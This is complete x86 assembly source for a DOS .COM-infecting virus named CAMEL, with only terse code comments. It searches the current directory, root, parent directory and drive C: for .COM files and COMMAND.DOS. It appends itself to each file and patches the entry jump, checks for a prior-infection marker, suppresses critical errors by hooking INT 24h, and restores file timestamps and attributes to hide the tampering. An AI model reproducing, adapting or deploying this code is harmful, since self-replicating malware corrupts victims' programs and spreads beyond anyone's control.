CAMEL         SEGMENT
              ASSUME   CS:CAMEL

virus_size    EQU      v_end - v_start

              ORG      100h

;==================================================================================================;
Begin:        DB       0E9h, 00h, 00h            ; < Empty 3-bytes for write jump code >
;==================================================================================================;
v_start:      NOP                                ; < Calculate delta offset >
              DB       0E8h, 00h, 00h            ;
delta:        POP      BP                        ;
              SUB      BP, offset delta          ;
;==================================================================================================;
              MOV      SI,0080h                  ; < Save DTA >
              LEA      DI, tmp_dta[BP]           ;
              MOV      CX,SI                     ;
          rep MOVSB                              ;
;==================================================================================================;
              JMP      Real_start                ; < Jump >
;--------------------------------------------------------------------------------------------------;

Strings       DB       7Fh, 7Fh, 7Fh, 7Fh        ; < jump code value + 1Ah >
                                                 ;
_jump_code    DB       0E9h                      ;
              DW       ?                         ;
                                                 ;
_attr         DB       ?                         ;
_time         DW       ?                         ;
_date         DW       ?                         ;
                                                 ;
_Target       DB       '*.c?m',0                 ;
_Target_1     DB       'com????.dos',0           ;
_3bytes       DB       0CDh, 20h, 00h            ;
_chk_str      DB       4 DUP (?)                 ;
                                                 ;
_drive        DB       ?                         ;
_root         DB       '\',0                     ;
_UP           DB       '..',0                    ;
_directory    DB       '\'                       ;
              DB       63 DUP (?)                ;
                                                 ;
_int24_off    DW       ?                         ;
_int24_seg    DW       ?                         ;

;==================================================================================================;

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>;
new_INT24     PROC                               ;                                                 ;
                                                 ;                                                 ;
              IRET                               ;                                                 ;
                                                 ;                                                 ;
new_INT24     ENDP                               ;                                                 ;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>;
move_FP       PROC                               ; < Move file pointer >                           ;
              MOV      AH,42h                    ;                                                 ;
              XOR      CX,CX                     ;                                                 ;
              MOV      DX,CX                     ;                                                 ;
              INT      21h                       ;                                                 ;
              RET                                ;                                                 ;
move_FP       ENDP                               ;                                                 ;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>;
inf_rtn       PROC                                                                                 ;
;--------------------------------------------------------------------------------------------------;
              MOV      SI,009Ch                  ; < Check the size >                              ;
              CMP      word ptr [SI], 0          ;                                                 ;
              JE       pass_001                  ;                                                 ;
              STC                                ;                                                 ;
              MOV      BL,1                      ;                                                 ;
              RET                                ;                                                 ;
pass_001:     SUB      SI,+2                     ;                                                 ;
              CMP      word ptr [SI], 1024       ;                                                 ;
              JAE      pass_002                  ;                                                 ;
              STC                                ;                                                 ;
              MOV      BL,1                      ;                                                 ;
              RET                                ;                                                 ;
pass_002:     CMP      word ptr [SI], 63000      ;                                                 ;
              JB       pass_003                  ;                                                 ;
              STC                                ;                                                 ;
              MOV      BL,1                      ;                                                 ;
              RET                                ;                                                 ;
;--------------------------------------------------------------------------------------------------;
pass_003:     SUB      SI,+5                     ; < Save attribute, time, date >                  ;
              LEA      DI, _attr[BP]             ;                                                 ;
              MOVSB                              ;                                                 ;
              MOVSW                              ;                                                 ;
              MOVSW                              ;                                                 ;
;--------------------------------------------------------------------------------------------------;
              MOV      AX,4301h                  ; < Clear attribute >                             ;
              XOR      CX,CX                     ;                                                 ;
              MOV      DX,009Eh                  ;                                                 ;
              INT      21h                       ;                                                 ;
              JNC      pass_004                  ;                                                 ;
              MOV      BL,2                      ;                                                 ;
              RET                                ;                                                 ;
;--------------------------------------------------------------------------------------------------;
pass_004:     MOV      AX,3D02h                  ; < Open the file >                               ;
              MOV      DX,009Eh                  ;                                                 ;
              INT      21h                       ;                                                 ;
              JNC      pass_005                  ;                                                 ;
              MOV      BL,3                      ;                                                 ;
              RET                                ;                                                 ;
;--------------------------------------------------------------------------------------------------;
pass_005:     XCHG     AX,BX                     ; < Get Handle >                                  ;
;--------------------------------------------------------------------------------------------------;
              MOV      AH,3Fh                    ; < Read 3-bytes >                                ;
              MOV      CX,3                      ;                                                 ;
              LEA      DX, _3bytes[BP]           ;                                                 ;
              INT      21h                       ;                                                 ;
;--------------------------------------------------------------------------------------------------;
                                                 ; < Check, if already infected >                  ;
              LEA      SI, _3bytes[BP]           ;                                                 ;
              CMP      byte ptr [SI], 0E9h       ;                                                 ;
              JZ       pass_006                  ;                                                 ;
              JMP      pass_008                  ;                                                 ;
pass_006:     MOV      DX,[SI+1]                 ;                                                 ;
              ADD      DX,1Ah                    ;                                                 ;
              MOV      AX,4200h                  ;                                                 ;
              XOR      CX,CX                     ;                                                 ;
              INT      21h                       ;                                                 ;
                                                 ;                                                 ;
              MOV      AH,3Fh                    ;                                                 ;
              MOV      CX,4                      ;                                                 ;
              LEA      DX, _chk_str[BP]          ;                                                 ;
              INT      21h                       ;                                                 ;
                                                 ;                                                 ;
              MOV      AX, word ptr _chk_str[BP] ;                                                 ;
              CMP      AX, word ptr Strings[BP]  ;                                                 ;
              JNZ      pass_008                  ;                                                 ;
pass_007:     MOV      AX, word ptr _chk_str[BP+2]                                                 ;
              CMP      AX, word ptr Strings[BP+2]                                                  ;
              JNZ      pass_008                  ;                                                 ;
              JMP      al_infected               ;                                                 ;
;--------------------------------------------------------------------------------------------------;
pass_008:                                        ;                                                 ;
              MOV      AL,02h                    ; < Move file pointer to the end >                ;
              CALL     move_FP                   ;                                                 ;
;--------------------------------------------------------------------------------------------------;
              SUB      AX,+3                     ;*-> AX:== jump code                              ;
              LEA      SI, _jump_code[BP]        ; < Save jump code >                              ;
              MOV      [SI+1],AX                 ;                                                 ;
;--------------------------------------------------------------------------------------------------;
              MOV      AH,40h                    ; < Append virus >                                ;
              MOV      CX, virus_size            ;                                                 ;
              LEA      DX, v_start[BP]           ;                                                 ;
              INT      21h                       ;                                                 ;
;--------------------------------------------------------------------------------------------------;
              MOV      AL,00h                    ; < Move file pointer to the first >              ;
              CALL     move_FP                   ;                                                 ;
;--------------------------------------------------------------------------------------------------;
              MOV      AH,40h                    ; < Write jump code >                             ;
              MOV      CX,3                      ;                                                 ;
              LEA      DX, _jump_code[BP]        ;                                                 ;
              INT      21h                       ;                                                 ;
;--------------------------------------------------------------------------------------------------;
al_infected:  MOV      AX,5701h                  ; < Restore time & date >                         ;
              MOV      CX, _time[BP]             ;                                                 ;
              MOV      DX, _date[BP]             ;                                                 ;
              INT      21h                       ;                                                 ;
;--------------------------------------------------------------------------------------------------;
              MOV      AH,3Eh                    ; < Close the file >                              ;
              INT      21h                       ;                                                 ;
;--------------------------------------------------------------------------------------------------;
              MOV      AX,4301h                  ; < Restore attribute >                           ;
              MOV      CL, _attr[BP]             ;                                                 ;
              XOR      CH,CH                     ;                                                 ;
              MOV      DX,009Eh                  ;                                                 ;
              INT      21h                       ;                                                 ;
;--------------------------------------------------------------------------------------------------;
              CLC                                ; if no error                                     ;
              RET                                ;   then reset the carry flag                     ;
inf_rtn       ENDP                               ;     and return                                  ;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>;
change_dir    PROC                                                                                 ;
              MOV      AH,3Bh                    ; < Change directory >                            ;
              INT      21h                       ;                                                 ;
              RET                                ;                                                 ;
change_dir    ENDP                                                                                 ;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>;

Real_start:                                      ; < Intercept INT 24h >
              XOR      AX,AX                     ;
              MOV      DS,AX                     ;
              MOV      SI,0090h                  ;
              LEA      DI, _int24_off[BP]        ;
              MOVSW                              ;
              MOVSW                              ;
;--------------------------------------------------------------------------------------------------;
              MOV      SI,0090h                  ;
              MOV      AX, offset NEW_INT24      ;
              MOV      DS:[SI],AX                ;
              ADD      SI,+2                     ;
              MOV      AX,CS                     ;
              MOV      DS:[SI],AX                ;
                                                 ;
              PUSH     CS                        ;
              POP      DS                        ;
;==================================================================================================;
              MOV      AH,19h                    ; < Get Current drive >
              INT      21h                       ;
              MOV      _drive[BP],AL             ;
;==================================================================================================;
              MOV      AH,47h                    ; < Get Current directory >
              XOR      DX,DX                     ;*-> drive number ( 0 is current drive )
              LEA      SI, _directory[BP+1]      ;
              INT      21h                       ;
;==================================================================================================;
              LEA      SI, _3bytes[BP]           ; < Restore 3-bytes >
              MOV      DI,100h                   ;
              PUSH     DI                        ;
              MOVSW                              ;
              MOVSB                              ;
;==================================================================================================;
              MOV      AH,4Eh                    ; < Search a file >
              MOV      CX,27h                    ;
              LEA      DX, _Target[BP]           ;
again:        INT      21h                       ;
              JC       fnd_err                   ;*-> if not found....
;==================================================================================================;
              CALL     inf_rtn                   ; < Error check 1 >
              JC       chk_problem               ;
no_problem:   MOV      AH,4Fh                    ;
              JMP      again                     ;
chk_problem:  CMP      BL,1                      ;   if BL == 1
              JE       no_problem                ;      (Size error or already infected..)
              CMP      BL,2                      ;   if BL == 2
              JE       wrt_err                   ;      (Attribute clear error..)
              CMP      BL,3                      ;   if BL == 3
              JE       no_problem                ;      (File open error..)
;==================================================================================================;
wrt_err:      CMP      _drive[BP], +2            ;*-> if current drive is 'C:'
              JNB      no_problem                ;      then search next files.
                                                 ;    otherwise....
              MOV      AH,0Eh                    ;*-> Change current drive to C:(hard disk)
              MOV      DL,02h                    ;
              INT      21h                       ;
;==================================================================================================;
fnd_err:      LEA      DX, _root[BP]             ; < Change directory to ROOT >
              CALL     change_dir                ;
;==================================================================================================;
              MOV      AH,4Eh                    ;  < Search a file >
              MOV      CX,27h                    ;
              LEA      DX, _Target[BP]           ;
again_2:      INT      21h                       ;
              JC       search_comdos             ;
;==================================================================================================;
              CALL     inf_rtn                   ;  < Error check 2 >
              JC       chk_problem_1             ;
no_problem_1: MOV      AH,4Fh                    ;
              JMP      again_2                   ;
chk_problem_1:                                   ;
              CMP      BL,1                      ;
              JE       no_problem_1              ;
              CMP      BL,2                      ;
              JE       wrt_err_2                 ;
              CMP      BL,3                      ;
              JE       no_problem_1              ;
              CMP      BL,4                      ;
                                                 ;
;==================================================================================================;
wrt_err_2:                                       ; ¼ó....

;==================================================================================================;
search_comdos:                                   ;
              MOV      AH,4Eh                    ; < Search a file > COMMAND.DOS
              MOV      CX,27h                    ;
              LEA      DX, _Target_1[BP]         ;
              INT      21h                       ;
              JC       no_found                  ;
              CALL     inf_rtn                   ;
;==================================================================================================;
no_found:     LEA      DX, _directory[BP]
              CALL     change_dir                ; < Change directory to origin >
;==================================================================================================;
              LEA      DX, _UP[BP]               ;
              CALL     change_dir                ;
;==================================================================================================;
              MOV      AH,4Eh                    ; < Search a file >
              MOV      CX,27h                    ;
              LEA      DX, _Target[BP]           ;
              INT      21h                       ;
;==================================================================================================;
              JC       QUIT                      ;
                                                 ;
              CALL     inf_rtn                   ;
                                                 ;
;==================================================================================================;
QUIT:                                            ;
              MOV      AH,0Eh                    ;
              MOV      DL, _drive[BP]            ;
              INT      21h                       ;
                                                 ;
              LEA      DX, _directory[BP]        ;
              CALL     change_dir                ;
              LEA      SI, tmp_dta[BP]           ; < Restore DTA >
              MOV      DI,0080h                  ;
              MOV      CX,DI                     ;
          rep MOVSB                              ;
;==================================================================================================;
              XOR      AX,AX                     ; < Restore INT 24H >
              MOV      ES,AX                     ;
                                                 ;
              LEA      SI, _int24_off[BP]        ;
              MOV      DI,0090h                  ;
              MOVSW                              ;
              MOVSW                              ;
                                                 ;
              PUSH     CS                        ;
              POP      ES                        ;
;==================================================================================================;


              RETN

v_end:
tmp_dta       DB       80h DUP (?)

CAMEL         ENDS
              END      Begin
